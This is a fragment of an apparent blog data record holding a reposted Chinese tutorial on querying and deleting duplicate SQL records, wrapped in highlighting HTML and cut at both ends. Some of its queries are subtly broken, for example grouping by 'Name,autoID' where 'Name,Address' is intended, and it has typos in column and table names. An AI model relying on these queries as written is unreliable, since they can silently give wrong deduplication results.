style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div>\n</div>","source":"_posts/SQL重复记录查询（转载）.md","raw":"---\ntitle: SQL重复记录查询（转载）\ndate: 2016-10-05 19:34:04\ntags: Sql\ncategories: Sql\n---\n<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> * <font color=\"#0000ff\">from</font> testtable</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: 